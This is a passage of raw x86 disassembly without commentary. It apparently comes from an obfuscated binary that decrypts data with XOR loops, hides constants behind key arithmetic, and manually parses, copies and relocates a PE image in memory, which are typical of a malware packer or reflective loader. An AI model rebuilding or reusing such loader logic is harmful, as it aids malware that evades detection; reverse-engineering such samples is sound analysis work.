  4175c0:	mov    ecx,DWORD PTR [ebp-0x50]
  4175c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4175c9:	xor    ecx,ebx
  4175cb:	add    ecx,esi
  4175cd:	push   ecx
  4175ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4175d1:	xor    ecx,ebx
  4175d3:	add    ecx,esi
  4175d5:	push   ecx
  4175d6:	push   DWORD PTR [ebp-0x2c]
  4175d9:	call   DWORD PTR [eax+0x18]
  4175dc:	mov    eax,DWORD PTR [ebp-0x34]
  4175df:	mov    DWORD PTR [ebp-0x2c],edi
  4175e2:	mov    DWORD PTR [ebp-0x3c],eax
  4175e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4175e8:	mov    DWORD PTR [ebp-0x10],eax
  4175eb:	mov    eax,DWORD PTR [ebp-0x18]
  4175ee:	mov    ecx,DWORD PTR [ebp-0x14]
  4175f1:	xor    eax,ebx
  4175f3:	add    eax,esi
  4175f5:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  4175fc:	mov    DWORD PTR [ebp-0x58],0x27143f14
  417603:	jmp    0x417636
  417605:	mov    edx,DWORD PTR [ebp-0x10]
  417608:	mov    edi,ecx
  41760a:	xor    edi,ebx
  41760c:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  417613:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41761b:	xor    cl,0x74
  41761e:	sub    cl,0x8
  417621:	movzx  ecx,cl
  417624:	cmp    edx,ecx
  417626:	jne    0x417640
  417628:	mov    ecx,DWORD PTR [ebp-0x18]
  41762b:	xor    ecx,ebx
  41762d:	lea    ecx,[ecx+edi*1+0x3272e2]
  417634:	xor    ecx,ebx
  417636:	cmp    ecx,0xf89c85bd
  41763c:	jne    0x417605
  41763e:	jmp    0x417647
  417640:	mov    eax,DWORD PTR [ebp-0x14]
  417643:	xor    eax,ebx
  417645:	add    eax,esi
  417647:	mov    ecx,DWORD PTR [ebp-0x14]
  41764a:	xor    ecx,ebx
  41764c:	add    ecx,esi
  41764e:	cmp    ecx,eax
  417650:	je     0x4177c6
  417656:	mov    eax,DWORD PTR [ebp-0x10]
  417659:	mov    eax,DWORD PTR [eax+0x8]
  41765c:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  417663:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41766a:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  417671:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  417678:	mov    DWORD PTR [ebp-0x20],eax
  41767b:	mov    eax,DWORD PTR [ebp+0x8]
  41767e:	mov    ecx,DWORD PTR [ebp-0x24]
  417681:	xor    ecx,ebx
  417683:	add    ecx,esi
  417685:	push   ecx
  417686:	mov    ecx,DWORD PTR [ebp-0x48]
  417689:	mov    eax,DWORD PTR [eax+0x1d8]
  41768f:	xor    ecx,ebx
  417691:	add    ecx,esi
  417693:	push   ecx
  417694:	mov    ecx,DWORD PTR [ebp-0x40]
  417697:	xor    ecx,ebx
  417699:	add    ecx,esi
  41769b:	push   ecx
  41769c:	mov    ecx,DWORD PTR [ebp-0xc]
  41769f:	xor    ecx,ebx
  4176a1:	add    ecx,esi
  4176a3:	push   ecx
  4176a4:	call   DWORD PTR [eax+0x14]
  4176a7:	mov    edi,eax
  4176a9:	mov    eax,DWORD PTR [ebp+0x8]
  4176ac:	mov    ecx,DWORD PTR [ebp-0x24]
  4176af:	mov    eax,DWORD PTR [eax+0x1d8]
  4176b5:	xor    ecx,ebx
  4176b7:	add    ecx,esi
  4176b9:	push   ecx
  4176ba:	mov    ecx,DWORD PTR [ebp-0x48]
  4176bd:	xor    ecx,ebx
  4176bf:	add    ecx,esi
  4176c1:	push   ecx
  4176c2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176c5:	push   DWORD PTR [ebp-0x20]
  4176c8:	xor    ecx,ebx
  4176ca:	add    ecx,esi
  4176cc:	push   ecx
  4176cd:	call   DWORD PTR [eax+0x14]
  4176d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4176d3:	xor    ecx,ebx
  4176d5:	add    ecx,esi
  4176d7:	mov    DWORD PTR [ebp-0x24],eax
  4176da:	cmp    ecx,edi
  4176dc:	je     0x417a69
  4176e2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176e5:	xor    ecx,ebx
  4176e7:	add    ecx,esi
  4176e9:	cmp    ecx,eax
  4176eb:	je     0x417a69
  4176f1:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  4176f8:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  4176ff:	mov    ecx,DWORD PTR [ebp-0x40]
  417702:	xor    cl,0x9b
  417705:	sub    cl,0x1e
  417708:	mov    BYTE PTR [edi],cl
  41770a:	mov    ecx,DWORD PTR [ebp-0xc]
  41770d:	xor    cl,0x9b
  417710:	sub    cl,0x1e
  417713:	mov    BYTE PTR [edi+0x1],cl
  417716:	mov    ecx,DWORD PTR [ebp-0x4c]
  417719:	xor    cl,0x9b
  41771c:	sub    cl,0x1e
  41771f:	mov    BYTE PTR [edi+0x2],cl
  417722:	and    DWORD PTR [ebp-0xb4],0x0
  417729:	and    DWORD PTR [ebp-0xa4],0x0
  417730:	lea    ecx,[ebp-0xa4]
  417736:	push   ecx
  417737:	push   DWORD PTR [ebp-0x20]
  41773a:	push   eax
  41773b:	lea    eax,[ebp-0xb4]
  417741:	push   eax
  417742:	mov    eax,DWORD PTR [ebp-0x10]
  417745:	push   DWORD PTR [eax+0xc]
  417748:	mov    eax,DWORD PTR [ebp-0x2c]
  41774b:	add    eax,0x10
  41774e:	push   eax
  41774f:	push   edi
  417750:	call   0x416a9a
  417755:	mov    DWORD PTR [ebp-0x40],eax
  417758:	mov    eax,DWORD PTR [ebp+0x8]
  41775b:	mov    ecx,DWORD PTR [ebp-0x50]
  41775e:	mov    eax,DWORD PTR [eax+0x1d8]
  417764:	xor    ecx,ebx
  417766:	add    ecx,esi
  417768:	push   ecx
  417769:	mov    ecx,DWORD PTR [ebp-0xc]
  41776c:	xor    ecx,ebx
  41776e:	add    ecx,esi
  417770:	push   ecx
  417771:	push   edi
  417772:	call   DWORD PTR [eax+0x18]
  417775:	mov    eax,DWORD PTR [ebp-0x40]
  417778:	add    eax,0xffcd8d1e
  41777d:	xor    eax,ebx
  41777f:	cmp    eax,0xf89c8585
  417784:	mov    eax,DWORD PTR [ebp+0x8]
  417787:	mov    eax,DWORD PTR [eax+0x1d8]
  41778d:	mov    ecx,DWORD PTR [ebp-0x50]
  417790:	jne    0x4177b3
  417792:	xor    ecx,ebx
  417794:	add    ecx,esi
  417796:	push   ecx
  417797:	mov    ecx,DWORD PTR [ebp-0xc]
  41779a:	xor    ecx,ebx
  41779c:	add    ecx,esi
  41779e:	push   ecx
  41779f:	push   DWORD PTR [ebp-0x2c]
  4177a2:	call   DWORD PTR [eax+0x18]
  4177a5:	mov    eax,DWORD PTR [ebp-0x24]
  4177a8:	mov    DWORD PTR [ebp-0x2c],eax
  4177ab:	mov    eax,DWORD PTR [ebp-0x20]
  4177ae:	mov    DWORD PTR [ebp-0x3c],eax
  4177b1:	jmp    0x4177c6
  4177b3:	xor    ecx,ebx
  4177b5:	add    ecx,esi
  4177b7:	push   ecx
  4177b8:	mov    ecx,DWORD PTR [ebp-0xc]
  4177bb:	xor    ecx,ebx
  4177bd:	add    ecx,esi
  4177bf:	push   ecx
  4177c0:	push   DWORD PTR [ebp-0x24]
  4177c3:	call   DWORD PTR [eax+0x18]
  4177c6:	mov    eax,DWORD PTR [ebp-0x3c]
  4177c9:	mov    DWORD PTR [ebp-0x38],eax
  4177cc:	mov    eax,DWORD PTR [ebp-0x2c]
  4177cf:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  4177d6:	mov    DWORD PTR [ebp-0x40],eax
  4177d9:	mov    edi,0xf89c8584
  4177de:	mov    DWORD PTR [ebp-0x30],edi
  4177e1:	mov    eax,DWORD PTR [ebp-0x28]
  4177e4:	xor    eax,ebx
  4177e6:	add    eax,esi
  4177e8:	mov    DWORD PTR [ebp-0xc],eax
  4177eb:	mov    eax,DWORD PTR [ebp-0x28]
  4177ee:	xor    eax,ebx
  4177f0:	add    eax,esi
  4177f2:	mov    DWORD PTR [ebp-0x10],eax
  4177f5:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  4177fc:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  417803:	mov    eax,DWORD PTR [ebp-0x28]
  417806:	mov    ecx,DWORD PTR [ebp-0x38]
  417809:	xor    eax,ebx
  41780b:	add    eax,esi
  41780d:	cmp    ecx,eax
  41780f:	je     0x417a05
  417815:	jmp    0x4179e1
  41781a:	mov    ecx,DWORD PTR [ebp-0xc]
  41781d:	mov    eax,DWORD PTR [ebp-0x38]
  417820:	sub    eax,ecx
  417822:	mov    ecx,DWORD PTR [ebp-0x48]
  417825:	xor    ecx,ebx
  417827:	add    ecx,esi
  417829:	xor    edx,edx
  41782b:	div    ecx
  41782d:	mov    DWORD PTR [ebp-0x10],eax
  417830:	mov    eax,DWORD PTR [ebp-0x24]
  417833:	mov    ecx,DWORD PTR [ebp-0x10]
  417836:	xor    eax,ebx
  417838:	add    eax,esi
  41783a:	cmp    ecx,eax
  41783c:	jbe    0x417848
  41783e:	mov    eax,DWORD PTR [ebp-0x24]
  417841:	xor    eax,ebx
  417843:	add    eax,esi
  417845:	mov    DWORD PTR [ebp-0x10],eax
  417848:	mov    eax,DWORD PTR [ebp-0x48]
  41784b:	mov    ecx,DWORD PTR [ebp-0x10]
  41784e:	xor    eax,ebx
  417850:	add    eax,esi
  417852:	imul   eax,ecx
  417855:	mov    DWORD PTR [ebp-0x10],eax
  417858:	mov    eax,DWORD PTR [ebp-0x28]
  41785b:	mov    ecx,DWORD PTR [ebp-0x10]
  41785e:	xor    eax,ebx
  417860:	add    eax,esi
  417862:	cmp    ecx,eax
  417864:	je     0x4179cf
  41786a:	mov    eax,DWORD PTR [ebp-0x10]
  41786d:	mov    DWORD PTR [ebp-0x20],eax
  417870:	mov    eax,DWORD PTR [ebp-0xc]
  417873:	add    eax,DWORD PTR [ebp-0x40]
  417876:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41787d:	mov    DWORD PTR [ebp-0x10],edi
  417880:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  417887:	mov    DWORD PTR [ebp-0x1c],eax
  41788a:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  417891:	mov    DWORD PTR [ebp-0x8],edi
  417894:	mov    eax,DWORD PTR [ebp-0x54]
  417897:	xor    eax,ebx
  417899:	add    eax,esi
  41789b:	jmp    0x41798e
  4178a0:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  4178aa:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  4178b4:	mov    eax,DWORD PTR [ebp-0x8]
  4178b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4178ba:	xor    eax,ebx
  4178bc:	add    eax,esi
  4178be:	imul   eax,ecx
  4178c1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178c4:	mov    al,BYTE PTR [eax+ecx*1]
  4178c7:	mov    BYTE PTR [ebp-0x1],al
  4178ca:	mov    eax,DWORD PTR [ebp-0x8]
  4178cd:	mov    ecx,DWORD PTR [ebp-0x18]
  4178d0:	xor    eax,ebx
  4178d2:	add    eax,esi
  4178d4:	imul   eax,ecx
  4178d7:	mov    ecx,DWORD PTR [ebp-0x4c]
  4178da:	xor    ecx,ebx
  4178dc:	add    eax,ecx
  4178de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178e1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  4178e9:	mov    ecx,DWORD PTR [ebp-0xac]
  4178ef:	xor    ecx,ebx
  4178f1:	lea    eax,[ecx+eax*1+0x3272e2]
  4178f8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4178fc:	xor    ecx,eax
  4178fe:	mov    BYTE PTR [ebp-0x1],cl
  417901:	mov    al,BYTE PTR [ebp-0x1]
  417904:	mov    ecx,DWORD PTR [ebp-0x8]
  417907:	mov    edx,DWORD PTR [ebp-0x18]
  41790a:	xor    ecx,ebx
  41790c:	add    ecx,esi
  41790e:	imul   ecx,edx
  417911:	mov    edx,DWORD PTR [ebp-0x1c]
  417914:	mov    BYTE PTR [ecx+edx*1],al
  417917:	mov    eax,DWORD PTR [ebp-0x8]
  41791a:	mov    ecx,DWORD PTR [ebp-0x18]
  41791d:	xor    eax,ebx
  41791f:	add    eax,esi
  417921:	imul   eax,ecx
  417924:	mov    ecx,DWORD PTR [ebp-0x1c]
  417927:	mov    al,BYTE PTR [eax+ecx*1]
  41792a:	mov    BYTE PTR [ebp-0x1],al
  41792d:	mov    eax,DWORD PTR [ebp-0x8]
  417930:	mov    ecx,DWORD PTR [ebp-0x18]
  417933:	xor    eax,ebx
  417935:	add    eax,esi
  417937:	imul   eax,ecx
  41793a:	mov    ecx,DWORD PTR [ebp-0x10]
  41793d:	xor    ecx,ebx
  41793f:	add    eax,ecx
  417941:	mov    ecx,DWORD PTR [ebp-0x1c]
  417944:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41794c:	mov    ecx,DWORD PTR [ebp-0x9c]
  417952:	xor    ecx,ebx
  417954:	lea    eax,[ecx+eax*1+0x3272e2]
  41795b:	movzx  ecx,BYTE PTR [ebp-0x1]
  41795f:	xor    ecx,eax
  417961:	mov    BYTE PTR [ebp-0x1],cl
  417964:	mov    al,BYTE PTR [ebp-0x1]
  417967:	mov    ecx,DWORD PTR [ebp-0x8]
  41796a:	mov    edx,DWORD PTR [ebp-0x18]
  41796d:	xor    ecx,ebx
  41796f:	add    ecx,esi
  417971:	imul   ecx,edx
  417974:	mov    edx,DWORD PTR [ebp-0x1c]
  417977:	mov    BYTE PTR [ecx+edx*1],al
  41797a:	mov    eax,DWORD PTR [ebp-0x34]
  41797d:	mov    ecx,DWORD PTR [ebp-0x10]
  417980:	xor    eax,ebx
  417982:	xor    ecx,ebx
  417984:	add    eax,esi
  417986:	add    ecx,esi
  417988:	imul   eax,ecx
  41798b:	add    eax,DWORD PTR [ebp-0x18]
  41798e:	mov    DWORD PTR [ebp-0x18],eax
  417991:	mov    eax,DWORD PTR [ebp-0x18]
  417994:	mov    ecx,DWORD PTR [ebp-0x20]
  417997:	cmp    ecx,eax
  417999:	jb     0x4178a0
  41799f:	mov    eax,DWORD PTR [ebp-0x10]
  4179a2:	mov    ecx,DWORD PTR [ebp-0x20]
  4179a5:	xor    eax,ebx
  4179a7:	add    eax,esi
  4179a9:	imul   eax,ecx
  4179ac:	mov    ecx,DWORD PTR [ebp-0x54]
  4179af:	xor    ecx,ebx
  4179b1:	add    ecx,esi
  4179b3:	or     eax,ecx
  4179b5:	mov    ecx,DWORD PTR [ebp-0x30]
  4179b8:	xor    ecx,ebx
  4179ba:	add    eax,ecx
  4179bc:	mov    ecx,DWORD PTR [ebp-0x30]
  4179bf:	xor    ecx,ebx
  4179c1:	add    eax,ecx
  4179c3:	mov    ecx,DWORD PTR [ebp-0xc]
  4179c6:	lea    eax,[eax+ecx*1+0x64e5c4]
  4179cd:	jmp    0x4179de
  4179cf:	mov    eax,DWORD PTR [ebp-0x30]
  4179d2:	mov    ecx,DWORD PTR [ebp-0xc]
  4179d5:	xor    eax,ebx
  4179d7:	lea    eax,[eax+ecx*1+0x3272e2]
  4179de:	mov    DWORD PTR [ebp-0xc],eax
  4179e1:	mov    eax,DWORD PTR [ebp-0x30]
  4179e4:	xor    eax,ebx
  4179e6:	mov    ecx,0xffcd8d1e
  4179eb:	sub    ecx,eax
  4179ed:	add    ecx,DWORD PTR [ebp-0x38]
  4179f0:	mov    eax,DWORD PTR [ebp-0x30]
  4179f3:	mov    edx,DWORD PTR [ebp-0xc]
  4179f6:	xor    eax,ebx
  4179f8:	add    eax,esi
  4179fa:	imul   eax,edx
  4179fd:	cmp    eax,ecx
  4179ff:	jbe    0x41781a
  417a05:	push   DWORD PTR [ebp+0x8]
  417a08:	mov    eax,DWORD PTR [ebp+0x8]
  417a0b:	push   DWORD PTR [eax+0x1cc]
  417a11:	lea    eax,[ebp-0xa0]
  417a17:	push   eax
  417a18:	mov    eax,DWORD PTR [ebp+0x8]
  417a1b:	mov    eax,DWORD PTR [eax+0x1c4]
  417a21:	push   DWORD PTR [eax]
  417a23:	mov    eax,DWORD PTR [ebp+0x8]
  417a26:	mov    eax,DWORD PTR [eax+0x1c0]
  417a2c:	push   DWORD PTR [eax]
  417a2e:	push   DWORD PTR [ebp-0x3c]
  417a31:	push   DWORD PTR [ebp-0x2c]
  417a34:	call   0x4184cb
  417a39:	mov    DWORD PTR [ebp-0x40],eax
  417a3c:	mov    eax,DWORD PTR [ebp-0x14]
  417a3f:	mov    ecx,DWORD PTR [ebp-0x2c]
  417a42:	xor    eax,ebx
  417a44:	add    eax,esi
  417a46:	cmp    eax,ecx
  417a48:	je     0x417a69
  417a4a:	mov    eax,DWORD PTR [ebp+0x8]
  417a4d:	mov    ecx,DWORD PTR [ebp-0x50]
  417a50:	mov    eax,DWORD PTR [eax+0x1d8]
  417a56:	xor    ecx,ebx
  417a58:	add    ecx,esi
  417a5a:	push   ecx
  417a5b:	mov    ecx,DWORD PTR [ebp-0x14]
  417a5e:	xor    ecx,ebx
  417a60:	add    ecx,esi
  417a62:	push   ecx
  417a63:	push   DWORD PTR [ebp-0x2c]
  417a66:	call   DWORD PTR [eax+0x18]
  417a69:	pop    edi
  417a6a:	pop    esi
  417a6b:	pop    ebx
  417a6c:	leave  
  417a6d:	ret    0x4
  417a70:	push   ebp
  417a71:	mov    ebp,esp
  417a73:	push   ecx
  417a74:	push   ecx
  417a75:	lea    eax,[ebp-0x8]
  417a78:	mov    DWORD PTR [ebp-0x4],eax
  417a7b:	push   esi
  417a7c:	mov    esi,DWORD PTR [ebp-0x4]
  417a7f:	mov    eax,0xf881ba0f
  417a84:	mov    DWORD PTR [esi],eax
  417a86:	mov    esi,DWORD PTR [ebp-0x8]
  417a89:	cmp    esi,eax
  417a8b:	pop    esi
  417a8c:	jne    0x417a96
  417a8e:	mov    BYTE PTR [ecx+0xa],0x7c
  417a92:	mov    BYTE PTR [edx+0x8],0x2f
  417a96:	mov    BYTE PTR [edx+0xa],0x7c
  417a9a:	mov    BYTE PTR [ecx+0x2],0x2
  417a9e:	leave  
  417a9f:	ret    
  417aa0:	push   ebp
  417aa1:	mov    ebp,esp
  417aa3:	push   ecx
  417aa4:	push   ecx
  417aa5:	lea    eax,[ebp-0x8]
  417aa8:	mov    DWORD PTR [ebp-0x4],eax
  417aab:	mov    edx,DWORD PTR [ebp-0x4]
  417aae:	mov    eax,0xf88b0be3
  417ab3:	mov    DWORD PTR [edx],eax
  417ab5:	mov    edx,DWORD PTR [ebp-0x8]
  417ab8:	cmp    edx,eax
  417aba:	jne    0x417acb
  417abc:	mov    eax,DWORD PTR [ebp+0x8]
  417abf:	mov    BYTE PTR [ecx+0x9],0x8
  417ac3:	mov    BYTE PTR [eax+0x7],0x47
  417ac7:	mov    BYTE PTR [ecx+0x6],0xf
  417acb:	mov    BYTE PTR [ecx+0x3],0x18
  417acf:	leave  
  417ad0:	ret    0x4
  417ad3:	push   ebp
  417ad4:	mov    ebp,esp
  417ad6:	push   ecx
  417ad7:	push   ecx
  417ad8:	lea    eax,[ebp-0x8]
  417adb:	mov    DWORD PTR [ebp-0x4],eax
  417ade:	mov    edx,DWORD PTR [ebp-0x4]
  417ae1:	mov    eax,0x7e0da0f
  417ae6:	mov    DWORD PTR [edx],eax
  417ae8:	mov    edx,DWORD PTR [ebp-0x8]
  417aeb:	cmp    edx,eax
  417aed:	jne    0x417af3
  417aef:	mov    BYTE PTR [ecx+0x7],0x47
  417af3:	mov    eax,DWORD PTR [ebp+0x8]
  417af6:	mov    BYTE PTR [ecx+0x1],0x5
  417afa:	mov    BYTE PTR [eax+0x9],0x28
  417afe:	leave  
  417aff:	ret    0x4
  417b02:	push   ebp
  417b03:	mov    ebp,esp
  417b05:	push   ecx
  417b06:	push   ecx
  417b07:	lea    eax,[ebp-0x8]
  417b0a:	mov    DWORD PTR [ebp-0x4],eax
  417b0d:	push   esi
  417b0e:	mov    esi,DWORD PTR [ebp-0x4]
  417b11:	mov    eax,0x7060e3e
  417b16:	mov    DWORD PTR [esi],eax
  417b18:	mov    esi,DWORD PTR [ebp-0x8]
  417b1b:	cmp    esi,eax
  417b1d:	pop    esi
  417b1e:	jne    0x417b2a
  417b20:	mov    BYTE PTR [edx+0x4],0x3
  417b24:	mov    WORD PTR [ecx+0x3],0x318
  417b2a:	mov    BYTE PTR [edx],0x3f
  417b2d:	leave  
  417b2e:	ret    
  417b2f:	push   ebp
  417b30:	mov    ebp,esp
  417b32:	push   ecx
  417b33:	push   ecx
  417b34:	lea    eax,[ebp-0x8]
  417b37:	mov    DWORD PTR [ebp-0x4],eax
  417b3a:	mov    edx,DWORD PTR [ebp-0x4]
  417b3d:	mov    eax,0xf8870b3f
  417b42:	mov    DWORD PTR [edx],eax
  417b44:	mov    edx,DWORD PTR [ebp-0x8]
  417b47:	cmp    edx,eax
  417b49:	jne    0x417b56
  417b4b:	mov    eax,DWORD PTR [ebp+0x8]
  417b4e:	mov    BYTE PTR [ecx+0x8],0xf
  417b52:	mov    BYTE PTR [eax+0x1],0x5
  417b56:	mov    BYTE PTR [ecx+0x5],0xb
  417b5a:	leave  
  417b5b:	ret    0x4
  417b5e:	push   esi
  417b5f:	mov    ecx,edi
  417b61:	call   0x417b2f
  417b66:	mov    edx,edi
  417b68:	mov    ecx,esi
  417b6a:	mov    BYTE PTR [esi],0x1f
  417b6d:	call   0x417b02
  417b72:	push   esi
  417b73:	mov    ecx,edi
  417b75:	mov    BYTE PTR [esi+0x5],0xb
  417b79:	call   0x417ad3
  417b7e:	push   esi
  417b7f:	mov    BYTE PTR [esi+0x6],0xf
  417b83:	call   0x417aa0
  417b88:	mov    BYTE PTR [esi+0x2],0x2
  417b8c:	mov    edx,esi
  417b8e:	jmp    0x417a70
  417b93:	push   ebp
  417b94:	mov    ebp,esp
  417b96:	push   ecx
  417b97:	mov    ecx,DWORD PTR [edx+0x194]
  417b9d:	push   esi
  417b9e:	mov    esi,DWORD PTR [ebp+0x8]
  417ba1:	mov    esi,DWORD PTR [esi]
  417ba3:	mov    DWORD PTR [ecx],esi
  417ba5:	mov    ecx,DWORD PTR [edx+0x194]
  417bab:	mov    ecx,DWORD PTR [ecx]
  417bad:	mov    esi,DWORD PTR [edx+0x190]
  417bb3:	mov    DWORD PTR [esi],ecx
  417bb5:	mov    eax,DWORD PTR [edx+0x194]
  417bbb:	mov    ecx,DWORD PTR [eax]
  417bbd:	mov    ecx,DWORD PTR [ecx+0x3c]
  417bc0:	add    ecx,DWORD PTR [eax]
  417bc2:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  417bc9:	mov    eax,DWORD PTR [ebp-0x4]
  417bcc:	movzx  ecx,WORD PTR [ecx+0x16]
  417bd0:	xor    eax,0x751089b
  417bd5:	add    eax,0x3272e2
  417bda:	pop    esi
  417bdb:	test   ecx,eax
  417bdd:	je     0x417beb
  417bdf:	mov    eax,DWORD PTR [edx+0x1c8]
  417be5:	mov    DWORD PTR [eax],0xf89c8584
  417beb:	leave  
  417bec:	ret    0x4
  417bef:	push   ebp
  417bf0:	mov    ebp,esp
  417bf2:	sub    esp,0x70
  417bf5:	and    DWORD PTR [ebp-0x20],0x0
  417bf9:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  417c00:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  417c07:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  417c0e:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  417c15:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  417c1c:	mov    eax,DWORD PTR [ebp+0x20]
  417c1f:	mov    eax,DWORD PTR [eax+0x194]
  417c25:	mov    DWORD PTR [ebp-0xc],eax
  417c28:	mov    eax,DWORD PTR [ebp+0x20]
  417c2b:	push   ebx
  417c2c:	push   esi
  417c2d:	mov    esi,DWORD PTR [eax+0x190]
  417c33:	mov    eax,DWORD PTR [ebp+0x20]
  417c36:	mov    eax,DWORD PTR [eax+0x18c]
  417c3c:	mov    DWORD PTR [ebp-0x8],eax
  417c3f:	mov    eax,DWORD PTR [eax]
  417c41:	push   edi
  417c42:	mov    DWORD PTR [ebp-0x4],esi
  417c45:	test   eax,eax
  417c47:	jne    0x417c54
  417c49:	push   DWORD PTR [ebp+0x1c]
  417c4c:	mov    edx,DWORD PTR [ebp+0x20]
  417c4f:	call   0x417b93
  417c54:	mov    eax,DWORD PTR [esi]
  417c56:	mov    ebx,DWORD PTR [esi]
  417c58:	add    ebx,DWORD PTR [eax+0x3c]
  417c5b:	mov    eax,DWORD PTR [ebp+0xc]
  417c5e:	mov    ecx,DWORD PTR [ebp-0x8]
  417c61:	mov    ecx,DWORD PTR [ecx]
  417c63:	mov    esi,0x751089b
  417c68:	xor    eax,esi
  417c6a:	mov    edi,0x3272e2
  417c6f:	add    eax,edi
  417c71:	cmp    eax,ecx
  417c73:	jne    0x417eab
  417c79:	mov    eax,DWORD PTR [ebp-0xc]
  417c7c:	mov    eax,DWORD PTR [eax]
  417c7e:	mov    DWORD PTR [ebp-0x10],eax
  417c81:	mov    eax,DWORD PTR [ebx+0x50]
  417c84:	mov    DWORD PTR [ebp-0x68],eax
  417c87:	mov    eax,DWORD PTR [ebp-0x18]
  417c8a:	xor    eax,esi
  417c8c:	add    eax,edi
  417c8e:	mov    DWORD PTR [ebp-0x64],eax
  417c91:	mov    eax,DWORD PTR [ebp-0x14]
  417c94:	and    DWORD PTR [ebp-0x6c],0x0
  417c98:	xor    eax,esi
  417c9a:	add    eax,edi
  417c9c:	mov    DWORD PTR [ebp-0x60],eax
  417c9f:	lea    eax,[ebp-0x70]
  417ca2:	push   eax
  417ca3:	mov    eax,DWORD PTR [ebp+0x8]
  417ca6:	xor    eax,esi
  417ca8:	add    eax,edi
  417caa:	push   eax
  417cab:	mov    eax,DWORD PTR [ebp+0x20]
  417cae:	add    eax,0xaa
  417cb3:	push   eax
  417cb4:	mov    eax,DWORD PTR [ebp+0x20]
  417cb7:	mov    eax,DWORD PTR [eax+0x198]
  417cbd:	mov    DWORD PTR [ebp-0x70],0x4
  417cc4:	push   DWORD PTR [eax]
  417cc6:	mov    eax,DWORD PTR [ebp+0x10]
  417cc9:	call   eax
  417ccb:	mov    ecx,DWORD PTR [ebp-0xc]
  417cce:	mov    ecx,DWORD PTR [ecx]
  417cd0:	mov    edx,DWORD PTR [ebp-0x8]
  417cd3:	mov    DWORD PTR [ebp-0x6c],eax
  417cd6:	mov    DWORD PTR [ebp+0x1c],eax
  417cd9:	mov    DWORD PTR [edx],ecx
  417cdb:	mov    ecx,DWORD PTR [ebp-0x4]
  417cde:	mov    DWORD PTR [ecx],eax
  417ce0:	mov    eax,DWORD PTR [ebx+0x50]
  417ce3:	mov    DWORD PTR [ebp-0x68],eax
  417ce6:	mov    eax,DWORD PTR [ebp-0x1c]
  417ce9:	xor    eax,esi
  417ceb:	add    eax,edi
  417ced:	mov    DWORD PTR [ebp-0x64],eax
  417cf0:	lea    eax,[ebp-0x20]
  417cf3:	mov    DWORD PTR [ebp-0x60],eax
  417cf6:	lea    eax,[ebp-0x70]
  417cf9:	push   eax
  417cfa:	mov    eax,DWORD PTR [ebp+0x8]
  417cfd:	xor    eax,esi
  417cff:	add    eax,edi
  417d01:	push   eax
  417d02:	mov    eax,DWORD PTR [ebp+0x20]
  417d05:	add    eax,0xee
  417d0a:	push   eax
  417d0b:	mov    eax,DWORD PTR [ebp+0x20]
  417d0e:	mov    eax,DWORD PTR [eax+0x198]
  417d14:	mov    DWORD PTR [ebp-0x70],0x4
  417d1b:	push   DWORD PTR [eax]
  417d1d:	mov    eax,DWORD PTR [ebp+0x10]
  417d20:	call   eax
  417d22:	test   eax,eax
  417d24:	je     0x417d49
  417d26:	and    DWORD PTR [ebp+0xc],0x0
  417d2a:	cmp    DWORD PTR [ebx+0x50],0x0
  417d2e:	jbe    0x417d49
  417d30:	mov    eax,DWORD PTR [ebp+0x1c]
  417d33:	mov    ecx,DWORD PTR [ebp-0x10]
  417d36:	sub    ecx,eax
  417d38:	mov    dl,BYTE PTR [ecx+eax*1]
  417d3b:	inc    DWORD PTR [ebp+0xc]
  417d3e:	mov    BYTE PTR [eax],dl
  417d40:	mov    edx,DWORD PTR [ebp+0xc]
  417d43:	inc    eax
  417d44:	cmp    edx,DWORD PTR [ebx+0x50]
  417d47:	jb     0x417d38
  417d49:	mov    edx,DWORD PTR [ebp+0x1c]
  417d4c:	mov    ecx,DWORD PTR [edx+0x3c]
  417d4f:	add    ecx,edx
  417d51:	mov    eax,DWORD PTR [ecx+0xa0]
  417d57:	mov    ebx,DWORD PTR [ecx+0x28]
  417d5a:	add    eax,edx
  417d5c:	sub    edx,DWORD PTR [ebp-0x10]
  417d5f:	add    ebx,DWORD PTR [ebp+0x1c]
  417d62:	mov    DWORD PTR [ebp+0xc],edx
  417d65:	mov    DWORD PTR [ebp-0x2c],ecx
  417d68:	mov    DWORD PTR [ebp-0x14],ebx
  417d6b:	mov    DWORD PTR [ebp-0x8],0x0
  417d72:	jmp    0x417dee
  417d74:	add    edx,0xfffffff8
  417d77:	shr    edx,1
  417d79:	mov    DWORD PTR [ebp-0x18],edx
  417d7c:	je     0x417dda
  417d7e:	lea    edx,[eax+0x8]
  417d81:	mov    DWORD PTR [ebp-0x4],edx
  417d84:	mov    edx,DWORD PTR [ebp-0x18]
  417d87:	mov    DWORD PTR [ebp-0x18],edx
